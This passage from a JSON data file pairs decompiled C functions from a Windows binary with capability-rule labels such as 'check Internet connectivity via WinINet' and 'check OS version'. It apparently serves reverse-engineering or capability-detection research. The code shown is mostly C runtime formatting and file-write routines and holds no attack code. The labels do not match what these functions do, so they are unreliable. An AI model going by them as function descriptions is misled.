        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.140019288(ulong arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    ulong var_50h;\n    ulong var_48h;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x1400401e0 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x14003e3b8;\n        var_28h._4_4_ = *0x14003e3bc;\n        uStack40 = *0x14003e3c0;\n        uStack36 = *0x14003e3c4;\n    }\n    var_48h = 0;\n    var_50h = arg1;\n    uVar1 = fcn.140018b00(&var_40h, &var_50h, 10);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.14000bc38(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 474
    },
    "14001af2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14001af24(uchar *arg1, uchar *arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uchar *puVar4;\n    uchar *arg2_00;\n    int64_t iVar5;\n    char in_R9B;\n    int32_t in_stack_00000028;\n    int32_t *in_stack_00000030;\n    uint8_t in_stack_00000038;\n    int64_t in_stack_00000040;\n    int64_t iVar6;\n    \n    iVar2 = 0;\n    if (0 < arg3) {\n        iVar2 = arg3;\n    }\n    if (iVar2 + 9 < arg2) {\n        if ((in_stack_00000038 != 0) && (puVar4 = arg1 + (*in_stack_00000030 == 0x2d),  0 < arg3)) {\n            iVar5 = -1;\n            do {\n                iVar6 = iVar5;\n                iVar5 = iVar6 + 1;\n            } while (puVar4[iVar5] != '\\0');\n            fcn.140007990(puVar4 + 1, puVar4, iVar6 + 2);\n        }\n        puVar4 = arg1;\n        if (*in_stack_00000030 == 0x2d) {\n            *arg1 = 0x2d;\n            puVar4 = arg1 + 1;\n        }\n        if (0 < arg3) {\n            *puVar4 = puVar4[1];\n            puVar4 = puVar4 + 1;\n            if (*(in_stack_00000040 + 0x28) == '\\0') {\n                fcn.140010150(in_stack_00000040);\n            }\n            *puVar4 = ***(*(in_stack_00000040 + 0x18) + 0xf8);\n        }\n        puVar4 = puVar4 + (in_stack_00000038 ^ 1) + arg3;\n        arg2_00 = arg1 + (arg2 - puVar4);\n        if (arg2 == 0xffffffffffffffff) {\n            arg2_00 = arg2;\n        }\n        iVar2 = fcn.140018aa0(puVar4, arg2_00, \"e+000\");\n        if (iVar2 != 0) {\n            fcn.14000c078(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            uVar3 = (*pcVar1)();\n            return uVar3;\n        }\n        if (in_R9B != '\\0') {\n            *puVar4 = 0x45;\n        }\n        if (**(in_stack_00000030 + 2) != '0') {\n            iVar2 = in_stack_00000030[1] + -1;\n            if (iVar2 < 0) {\n                iVar2 = -iVar2;\n                puVar4[1] = 0x2d;\n            }\n            if (99 < iVar2) {\n                puVar4[2] = puVar4[2] + iVar2 / 100;\n                iVar2 = iVar2 % 100;\n            }\n            if (9 < iVar2) {\n                puVar4[3] = puVar4[3] + iVar2 / 10;\n                iVar2 = iVar2 % 10;\n            }\n            puVar4[4] = puVar4[4] + iVar2;\n        }\n        if ((in_stack_00000028 == 2) && (puVar4[2] == '0')) {\n            fcn.140007990(puVar4 + 2, puVar4 + 3, 3);\n        }\n        uVar3 = 0;\n    }\n    else {\n        *(in_stack_00000040 + 0x30) = 1;\n        *(in_stack_00000040 + 0x2c) = 0x22;\n        fcn.14000bf58(0, 0, 0, 0);\n        uVar3 = 0x22;\n    }\n    return uVar3;\n}\n",
        "token_count": 917
    },
    "14001b1e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14001b1e0(uchar *arg1, ulong noname_1, ulong arg3, int32_t *arg4)\n\n{\n    uchar *arg1_00;\n    bool bVar1;\n    int32_t iVar2;\n    uchar *arg2;\n    int64_t iVar3;\n    int64_t iVar4;\n    char in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    if ((in_stack_00000028 != '\\0') && (arg4[1] + -1 == arg3)) {\n        *(arg1 + arg4[1] + -1 + (*arg4 == 0x2d)) = 0x30;\n    }\n    if (*arg4 == 0x2d) {\n        *arg1 = 0x2d;\n        arg1 = arg1 + 1;\n    }\n    iVar2 = arg4[1];\n    if (iVar2 < 1) {\n        if ((iVar2 == 0) && (**(arg4 + 2) == '0')) {\n            bVar1 = true;\n        }\n        else {\n            bVar1 = false;\n        }\n        if ((in_stack_00000028 == '\\0') || (!bVar1)) {\n            iVar4 = -1;\n            do {\n                iVar3 = iVar4;\n                iVar4 = iVar3 + 1;\n            } while (arg1[iVar4] != '\\0');\n            fcn.140007990(arg1 + 1, arg1, iVar3 + 2);\n        }\n        arg2 = arg1 + 1;\n        *arg1 = 0x30;\n    }\n    else {\n        arg2 = arg1 + iVar2;\n    }\n    if (0 < arg3) {\n        arg1_00 = arg2 + 1;\n        iVar4 = -1;\n        do {\n            iVar3 = iVar4;\n            iVar4 = iVar3 + 1;\n        } while (arg2[iVar4] != '\\0');\n        fcn.140007990(arg1_00, arg2, iVar3 + 2);\n        if (*(in_stack_00000030 + 0x28) == '\\0') {\n            fcn.140010150(in_stack_00000030);\n        }\n        *arg2 = ***(*(in_stack_00000030 + 0x18) + 0xf8);\n        if (arg4[1] < 0) {\n            iVar2 = -arg4[1];\n            if ((in_stack_00000028 != '\\0') || (iVar4 = -1,  iVar2 < arg3)) {\n                iVar4 = -1;\n                arg3._0_4_ = iVar2;\n            }\n            do {\n                iVar3 = iVar4;\n                iVar4 = iVar3 + 1;\n            } while (arg1_00[iVar4] != '\\0');\n            fcn.140007990(arg1_00 + arg3, arg1_00, iVar3 + 2);\n            fcn.140008040(arg1_00, 0x30, arg3);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 684
    },
    "14001b5a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.14001b5a4(uint64_t *arg1, uchar *arg2, uint64_t arg3, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    int64_t in_stack_00000028;\n    int32_t in_stack_00000030;\n    uint64_t in_stack_00000040;\n    int64_t in_stack_00000050;\n    \n    if (arg2 == NULL) {\n        *(in_stack_00000050 + 0x30) = 1;\n        *(in_stack_00000050 + 0x2c) = 0x16;\n    }\n    else {\n        if (((arg3 != 0) && (arg4 != 0)) && (in_stack_00000028 != 0)) {\n            if ((in_stack_00000030 == 0x41) || (in_stack_00000030 - 0x45U < 3)) {\n                uVar6 = 1;\n            }\n            else {\n                uVar6 = 0;\n            }\n            if (((in_stack_00000040 & 8) == 0) && (uVar1 = *arg1,  (uVar1 >> 0x34 & 0x7ff) == 0x7ff)) {\n                if ((uVar1 & 0xfffffffffffff) == 0) {\n                    iVar5 = 0;\n                }\n                else if ((uVar1 < 0) && ((uVar1 & 0xfffffffffffff) == 0x8000000000000)) {\n                    iVar5 = 0xc;\n                }\n                else {\n                    iVar5 = (-((uVar1 & 0x8000000000000) != 0) & 0xfffffffffffffffc) + 8;\n                }\n                if (arg3 < 4U - (uVar1 >> 0x3f)) {\n                    *arg2 = 0;\n                    return 0xc;\n                }\n                uVar7 = 0xffffffffffffffff;\n                if (uVar1 < 0) {\n                    *arg2 = 0x2d;\n                    arg2 = arg2 + 1;\n                    *arg2 = 0;\n                    if (arg3 != 0xffffffffffffffff) {\n                        arg3 = arg3 - 1;\n                    }\n                }\n                uVar6 = (uVar6 ^ 1) * 2;\n                do {\n                    uVar7 = uVar7 + 1;\n                } while (*(*((uVar6 + iVar5) * 8 + 0x140031be0) + uVar7) != '\\0');\n                iVar3 = fcn.140018aa0(arg2, arg3, *((uVar6 + (arg3 <= uVar7) + iVar5) * 8 + 0x140031be0));\n                if (iVar3 == 0) {\n                    return 0;\n                }\n                fcn.14000c078(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                uVar4 = (*pcVar2)();\n                return uVar4;\n            }\n            if (in_stack_00000030 != 0x41) {\n                if (in_stack_00000030 == 0x45) {\ncode_r0x00014001b7f1:\n                    uVar4 = fcn.14001ae28(arg1, arg2, arg3, arg4);\n                    return uVar4;\n                }\n                if (in_stack_00000030 == 0x46) {\ncode_r0x00014001b7c0:\n                    uVar4 = fcn.14001b108(arg1, arg2, arg3, arg4);\n                    return uVar4;\n                }\n                if (in_stack_00000030 != 0x47) {\n                    if (in_stack_00000030 == 0x61) goto code_r0x00014001b82b;\n                    if (in_stack_00000030 == 0x65) goto code_r0x00014001b7f1;\n                    if (in_stack_00000030 == 0x66) goto code_r0x00014001b7c0;\n                }\n                uVar4 = fcn.14001b338(arg1, arg2, arg3, arg4);\n                return uVar4;\n            }\ncode_r0x00014001b82b:\n            uVar4 = fcn.14001aa74(arg1, arg2, arg3, arg4);\n            return uVar4;\n        }\n        *(in_stack_00000050 + 0x30) = 1;\n        *(in_stack_00000050 + 0x2c) = 0x16;\n    }\n    fcn.14000bf58(0, 0, 0, 0);\n    return 0x16;\n}\n",
        "token_count": 1109
    },
    "14001ba3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.14001ba3c(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    \n    if ((arg2 == NULL) || (arg3 == 0)) {\n        *0x1400407d8 = 0;\n    }\n    else {\n        if (*arg2 != 0) {\n            if (*(arg4 + 0x28) == '\\0') {\n                fcn.140010150(arg4);\n            }\n            piVar2 = *(arg4 + 0x18);\n            uVar1 = *(piVar2 + 0xc);\n            if (uVar1 != 0xfde9) {\n                if (piVar2[0x27] == 0) {\n                    if (arg1 != NULL) {\n                        *arg1 = *arg2;\n                    }\n                    return 1;\n                }\n                if (*(*piVar2 + *arg2 * 2) < 0) {\n                    if ((((1 < *(piVar2 + 1)) && (*(piVar2 + 1) <= arg3)) &&\n                        (iVar3 = fcn.140020210(uVar1, 9),  iVar3 != 0)) ||\n                       ((*(*(arg4 + 0x18) + 8) <= arg3 && (arg2[1] != 0)))) {\n                        return *(*(arg4 + 0x18) + 8);\n                    }\n                }\n                else {\n                    iVar3 = fcn.140020210(uVar1, 9);\n                    if (iVar3 != 0) {\n                        return 1;\n                    }\n                }\n                *(arg4 + 0x30) = 1;\n                *(arg4 + 0x2c) = 0x2a;\n                return -1;\n            }\n            iVar3 = fcn.14002653c(arg1);\n            if (iVar3 < 0) {\n                return -1;\n            }\n            return iVar3;\n        }\n        if (arg1 != NULL) {\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 488
    },
    "14001be7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14001be7c(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    uint64_t uVar6;\n    \n    uVar6 = arg1;\n    iVar3 = fcn.140022480(uVar6 & 0xffffffff);\n    if (iVar3 != -1) {\n        if (((arg1 == 1) && ((*(*0x1400403d0 + 200) & 1) != 0)) || ((arg1 == 2 && ((*(*0x1400403d0 + 0x80) & 1) != 0))))\n        {\n            iVar3 = fcn.140022480(2);\n            iVar4 = fcn.140022480(1);\n            if (iVar4 == iVar3) goto code_r0x00014001be9e;\n        }\n        fcn.140022480(uVar6 & 0xffffffff);\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        if (iVar1 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x00014001befc;\n        }\n    }\ncode_r0x00014001be9e:\n    uVar2 = 0;\ncode_r0x00014001befc:\n    fcn.1400223c4(uVar6 & 0xffffffff);\n    *(*((uVar6 >> 6) * 8 + 0x1400403d0) + 0x38 + (arg1 & 0x3f) * 0x48) = 0;\n    if (uVar2 == 0) {\n        uVar5 = 0;\n    }\n    else {\n        fcn.140012c34(uVar2, arg2);\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 437
    },
    "14001c08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.14001c088(ulong *arg1, ulong arg2, uint8_t *arg3, uint64_t arg4)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    uint uVar3;\n    int64_t iVar4;\n    char *pcVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint8_t *puVar10;\n    uint64_t uVar11;\n    int64_t arg3_00;\n    ulong arg3_01;\n    char *pcVar12;\n    int32_t iVar13;\n    uint64_t uVar14;\n    uchar *in_stack_00000028;\n    uchar auStack280 [32];\n    uchar *puStack248;\n    uint uStack240;\n    ulong uStack232;\n    ulong uStack224;\n    uint16_t uStack216;\n    uint uStack212;\n    uint32_t uStack208;\n    uint8_t *puStack200;\n    uint64_t uStack192;\n    uint32_t uStack184;\n    int32_t iStack180;\n    int64_t iStack176;\n    uchar *puStack168;\n    uint8_t *puStack160;\n    ulong uStack152;\n    char *pcStack144;\n    uint8_t *puStack136;\n    ulong uStack128;\n    int64_t iStack120;\n    int64_t iStack112;\n    uint64_t uStack104;\n    ulong uStack96;\n    char acStack88 [8];\n    uint8_t uStack80;\n    uint8_t uStack79;\n    uchar auStack72 [8];\n    uint64_t uStack64;\n    \n    uStack96 = 0xfffffffffffffffe;\n    uStack64 = *0x14003e020 ^ auStack280;\n    iStack112 = arg2;\n    puStack168 = in_stack_00000028;\n    iVar4 = iStack112 >> 6;\n    uVar6 = arg2 & 0x3f;\n    uStack128 = *(*(iVar4 * 8 + 0x1400403d0) + 0x28 + uVar6 * 0x48);\n    puStack200 = arg3 + (arg4 & 0xffffffff);\n    iStack176 = iVar4;\n    puStack160 = arg3;\n    uStack104 = uVar6;\n    uStack184 = (*_sym.imp.KERNEL32.dll_GetConsoleOutputCP)();\n    uVar11 = 0;\n    if (in_stack_00000028[0x28] == '\\0') {\n        fcn.140010150(in_stack_00000028);\n    }\n    iStack180 = *(*(in_stack_00000028 + 0x18) + 0xc);\n    *arg1 = 0;\n    *(arg1 + 1) = 0;\n    uVar7 = uVar11;\n    if (puStack160 < arg3 + (arg4 & 0xffffffff)) {\n        do {\n            iStack120 = iVar4;\n            uStack216 = uStack216 & 0xff00 | *arg3;\n            uStack212 = 0;\n            uVar14 = 1;\n            if (iStack180 == 0xfde9) {\n                pcVar12 = uVar6 * 0x48 + 0x3e + *(iStack120 * 8 + 0x1400403d0);\n                pcVar5 = pcVar12;\n                uVar7 = uVar11;\n                uVar14 = uVar11;\n                do {\n                    uVar8 = uVar7;\n                    if (*pcVar5 == '\\0') break;\n                    uVar8 = uVar8 + 1;\n                    uVar7 = uVar8;\n                    uVar14 = uVar14 + 1;\n                    pcVar5 = pcVar5 + 1;\n                } while (uVar14 < 5);\n                if (uVar14 == 0) {\n                    cVar2 = *(*arg3 + 0x14003e420);\n                    iVar13 = cVar2 + 1;\n                    iVar4 = puStack200 - arg3;\n                    if (iVar4 < iVar13) {\n                        if (0 < iVar4) {\n                            uVar6 = uVar11;\n                            do {\n                                *(*((iStack112 >> 6) * 8 + 0x1400403d0) + uStack104 * 0x48 + 0x3e + uVar11) =\n                                     arg3[uVar11];\n                                uVar8 = uVar6 + 1;\n                                uVar6 = uVar8;\n                                uVar11 = uVar11 + 1;\n                            } while (uVar8 < iVar4);\n                        }\n                        *(arg1 + 4) = *(arg1 + 4) + iVar4;\n                        break;\n                    }\n                    uStack192 = 0;\n                    uVar8 = (iVar13 == 4) + 1;\n                    puStack248 = puStack168;\n                    puStack136 = arg3;\n                    iVar4 = fcn.140026580(&uStack212, &puStack136, uVar8, &uStack192);\n                    if (iVar4 == -1) break;\n                    uVar14 = uVar8;\n                    puVar10 = arg3 + cVar2;\n                    in_stack_00000028 = puStack168;\n                }\n                else {\n                    iVar13 = *(*(*(iStack176 * 8 + 0x1400403d0) + 0x3e + uVar6 * 0x48) + 0x14003e420) + 1;\n                    uVar8 = iVar13 - uVar8;\n                    uStack192 = uStack192 & 0xffffffff00000000 | uVar8;\n                    iVar4 = puStack200 - arg3;\n                    arg3_00 = uVar8;\n                    uVar7 = uVar11;\n                    if (iVar4 < arg3_00) {\n                        if (0 < iVar4) {\n                            uVar7 = uVar14;\n                            do {\n                                *(*(iStack176 * 8 + 0x1400403d0) + uVar7 + 0x3e + uVar6 * 0x48) = arg3[uVar7 - uVar14];\n                                uVar8 = uVar11 + 1;\n                                uVar11 = uVar8;\n                                uVar7 = uVar7 + 1;\n                            } while (uVar8 < iVar4);\n                        }\n                        *(arg1 + 4) = *(arg1 + 4) + iVar4;\n                        break;\n                    }\n                    do {\n                        acStack88[uVar7] = *pcVar12;\n                        uVar7 = uVar7 + 1;\n                        pcVar12 = pcVar12 + 1;\n                    } while (uVar7 < uVar14);\n                    uVar7 = uVar11;\n                    if (0 < arg3_00) {\n                        fcn.140007990(acStack88 + uVar14, arg3, arg3_00);\n                    }\n                    do {\n                        *(*(iStack176 * 8 + 0x1400403d0) + uVar7 + 0x3e + uVar6 * 0x48) = 0;\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 < uVar14);\n                    uStack152 = 0;\n                    pcStack144 = acStack88;\n                    uVar8 = (iVar13 == 4) + 1;\n                    uVar14 = uVar8;\n                    puStack248 = in_stack_00000028;\n                    iVar4 = fcn.140026580(&uStack212, &pcStack144, uVar8, &uStack152);\n                    if (iVar4 == -1) break;\n                    puVar10 = arg3 + (uStack192 + -1);\n                }\n            }\n            else {\n                iVar4 = *(iStack176 * 8 + 0x1400403d0);\n                uVar1 = *(iVar4 + 0x3d + uVar6 * 0x48);\n                if ((uVar1 & 4) == 0) {\n                    if (*(**(in_stack_00000028 + 0x18) + *arg3 * 2) < 0) {\n                        puVar10 = arg3 + 1;\n                        if (puVar10 < puStack200) {\n                            iVar13 = fcn.14001ba3c(&uStack212, arg3, 2, in_stack_00000028);\n                            if (iVar13 != -1) goto code_r0x00014001c385;\n                        }\n                        else {\n                            *(iVar4 + 0x3e + uVar6 * 0x48) = *arg3;\n                            puVar10 = *(iStack176 * 8 + 0x1400403d0) + 0x3d + uVar6 * 0x48;\n                            *puVar10 = *puVar10 | 4;\n                            *(arg1 + 4) = uVar7 + 1;\n                        }\n                        break;\n                    }\n                    arg3_01 = 1;\n                    puVar10 = arg3;\n                }\n                else {\n                    uStack80 = *(iVar4 + 0x3e + uVar6 * 0x48);\n                    uStack79 = *arg3;\n                    *(iVar4 + 0x3d + uVar6 * 0x48) = uVar1 & 0xfb;\n                    arg3_01 = 2;\n                    puVar10 = &uStack80;\n                }\n                iVar13 = fcn.14001ba3c(&uStack212, puVar10, arg3_01, in_stack_00000028);\n                puVar10 = arg3;\n                if (iVar13 == -1) break;\n            }\ncode_r0x00014001c385:\n            arg3 = puVar10 + 1;\n            uStack224 = 0;\n            uStack232 = 0;\n            uStack240 = 5;\n            puStack248 = auStack72;\n            uVar8 = fcn.14002026c(uStack184, 0, &uStack212, uVar14);\n            if (uVar8 == 0) break;\n            puStack248 = NULL;\n            iVar13 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n            if (iVar13 == 0) {\ncode_r0x00014001c4e0:\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                *arg1 = uVar3;\n                break;\n            }\n            uVar9 = (arg3 - puStack160) + *(arg1 + 1);\n            *(arg1 + 4) = uVar9;\n            if (uStack208 < uVar8) break;\n            if (uStack216 == '\\n') {\n                uStack216 = 0xd;\n                puStack248 = NULL;\n                iVar13 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n                if (iVar13 == 0) goto code_r0x00014001c4e0;\n                if (uStack208 == 0) break;\n                *(arg1 + 1) = *(arg1 + 1) + 1;\n                *(arg1 + 4) = *(arg1 + 4) + 1;\n                uVar9 = *(arg1 + 4);\n            }\n            uVar7 = uVar9;\n            iVar4 = iStack120;\n        } while (arg3 < puStack200);\n    }\n    fcn.140005b20(uStack64 ^ auStack280);\n    return;\n}\n",
        "token_count": 2568
    },
    "14001c9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpMode\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesWritten\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.14001c9cc(ulong arg1, int16_t *arg2, ulong arg3, int64_t arg4)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint64_t *puVar8;\n    int64_t iVar9;\n    int32_t iVar10;\n    uint64_t uVar11;\n    uint64_t arg4_00;\n    int16_t *piVar12;\n    ulong uStack112;\n    int32_t iStack104;\n    uint64_t uStack96;\n    int16_t iStack80;\n    ulong var_38h;\n    ulong lpNumberOfBytesWritten;\n    ulong var_20h;\n    ulong lpMode;\n    \n    iVar10 = 0;\n    arg4_00 = arg3;\n    uVar11 = arg1;\n    if (arg3 == 0) {\n        return 0;\n    }\n    if (arg2 == NULL) {\ncode_r0x00014001c9fc:\n        *(arg4 + 0x38) = 1;\n        *(arg4 + 0x34) = 0;\n        *(arg4 + 0x30) = 1;\n        *(arg4 + 0x2c) = 0x16;\n        fcn.14000bf58(0, 0, 0, 0);\n        return -1;\n    }\n    uVar7 = arg1 & 0x3f;\n    iVar9 = uVar11 >> 6;\n    iVar2 = *(iVar9 * 8 + 0x1400403d0);\n    cVar1 = *(iVar2 + 0x39 + uVar7 * 0x48);\n    if ((cVar1 - 1U < 2) && ((~arg3 & 1) == 0)) goto code_r0x00014001c9fc;\n    if ((*(iVar2 + 0x38 + uVar7 * 0x48) & 0x20) != 0) {\n        fcn.14001e338(uVar11 & 0xffffffff, 0, 2, arg4);\n    }\n    uStack96 = 0;\n    iVar5 = fcn.140026724(uVar11 & 0xffffffff);\n    if ((iVar5 == 0) || (-1 < *(*(iVar9 * 8 + 0x1400403d0) + 0x38 + uVar7 * 0x48))) {\ncode_r0x00014001cbb5:\n        iVar2 = *(iVar9 * 8 + 0x1400403d0);\n        if (-1 < *(iVar2 + 0x38 + uVar7 * 0x48)) {\n            uStack112 = 0;\n            iStack104 = 0;\n            iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(iVar2 + 0x28 + uVar7 * 0x48), arg2, arg4_00, &uStack112 + 4, 0)\n            ;\n            iVar10 = iStack104;\n            uVar3 = uStack112;\n            if (iVar5 == 0) {\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uStack112 = uStack112 & 0xffffffff00000000 | uVar6;\n                iVar10 = iStack104;\n                uVar3 = uStack112;\n            }\n            goto code_r0x00014001cc59;\n        }\n        if (cVar1 == '\\0') {\n            puVar8 = fcn.14001c514(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n        }\n        else if (cVar1 == '\\x01') {\n            puVar8 = fcn.14001c734(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n        }\n        else {\n            iVar10 = 0;\n            uVar3 = uStack96;\n            if (cVar1 != '\\x02') goto code_r0x00014001cc59;\n            puVar8 = fcn.14001c618(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n        }\n    }\n    else {\n        if (*(arg4 + 0x28) == '\\0') {\n            fcn.140010150(arg4);\n        }\n        if (((*(*(arg4 + 0x18) + 0x138) == 0) && (*(*(iVar9 * 8 + 0x1400403d0) + 0x39 + uVar7 * 0x48) == '\\0')) ||\n           (iVar5 = (*_sym.imp.KERNEL32.dll_GetConsoleMode)(),  iVar5 == 0)) goto code_r0x00014001cbb5;\n        if (cVar1 != '\\0') {\n            uVar3 = uStack96;\n            if (cVar1 - 1U < 2) {\n                uStack112 = 0;\n                uVar3 = uStack112;\n                if (arg2 < arg2 + arg4_00) {\n                    uStack112._4_4_ = 0;\n                    piVar12 = arg2;\n                    do {\n                        iStack80 = *piVar12;\n                        iVar4 = fcn.140026784();\n                        if (iVar4 != iStack80) {\ncode_r0x00014001cb79:\n                            uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                            uStack112 = uStack112 & 0xffffffff00000000 | uVar6;\n                            uVar3 = uStack112;\n                            break;\n                        }\n                        uStack112 = uStack112 & 0xffffffff | uStack112._4_4_ + 2 << 0x20;\n                        uVar6 = uStack112._4_4_ + 2;\n                        if (iStack80 == 10) {\n                            iVar4 = fcn.140026784(0xd);\n                            if (iVar4 != 0xd) goto code_r0x00014001cb79;\n                            uStack112 = uStack112 & 0xffffffff | uStack112._4_4_ + 3 << 0x20;\n                            iVar10 = iVar10 + 1;\n                            uVar6 = uStack112._4_4_ + 3;\n                        }\n                        uStack112._4_4_ = uVar6;\n                        piVar12 = piVar12 + 1;\n                        uVar3 = uStack112;\n                    } while (piVar12 < arg2 + arg4_00);\n                }\n            }\n            goto code_r0x00014001cc59;\n        }\n        puVar8 = fcn.14001c088(&uStack112, uVar11 & 0xffffffff, arg2, arg4_00);\n    }\n    iVar10 = *(puVar8 + 1);\n    uVar3 = *puVar8;\ncode_r0x00014001cc59:\n    uStack96 = uVar3;\n    iVar5 = uStack96 >> 0x20;\n    if (iVar5 != 0) {\n        return iVar5 - iVar10;\n    }\n    if (uStack96 != 0) {\n        if (uStack96 == 5) {\n            *(arg4 + 0x30) = 1;\n            *(arg4 + 0x2c) = 9;\n            *(arg4 + 0x38) = 1;\n            *(arg4 + 0x34) = 5;\n            return -1;\n        }\n        fcn.140012c34(uStack96 & 0xffffffff, arg4);\n        return -1;\n    }\n    if (((*(*(iVar9 * 8 + 0x1400403d0) + 0x38 + uVar7 * 0x48) & 0x40) != 0) && (*arg2 == '\\x1a')) {\n        return 0;\n    }\n    *(arg4 + 0x34) = 0;\n    *(arg4 + 0x30) = 1;\n    *(arg4 + 0x2c) = 0x1c;\n    *(arg4 + 0x38) = 1;\n    return -1;\n}\n",
        "token_count": 1925
    },
    "14001ccd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.14001ccdc(uint8_t **arg1)\n\n{\n    uint8_t uVar1;\n    uint8_t *arg2;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int64_t iVar6;\n    \n    if (arg1 == NULL) {\n        puVar5 = fcn.140012c78();\n        *puVar5 = 0x16;\n        fcn.14000c028();\n    }\n    else if (((*(arg1 + 0x14) >> 0xd & 1) != 0) && ((*(arg1 + 0x14) >> 0xc & 1) == 0)) {\n        if ((*(arg1 + 0x14) >> 1 & 1) == 0) {\n            LOCK();\n            *(arg1 + 0x14) = *(arg1 + 0x14) | 1;\n            if ((*(arg1 + 0x14) & 0x4c0) == 0) {\n                fcn.14001e340(arg1);\n            }\n            arg2 = arg1[1];\n            uVar4 = *(arg1 + 4);\n            *arg1 = arg2;\n            uVar2 = fcn.14001bbb4(arg1);\n            iVar3 = fcn.14001dabc(uVar2, arg2, uVar4);\n            *(arg1 + 2) = iVar3;\n            if (1 < iVar3 + 1U) {\n                if ((*(arg1 + 0x14) & 6) == 0) {\n                    iVar3 = fcn.14001bbb4(arg1);\n                    if ((iVar3 == -1) || (iVar3 = fcn.14001bbb4(arg1),  iVar3 == -2)) {\n                        iVar6 = 0x14003e3d0;\n                    }\n                    else {\n                        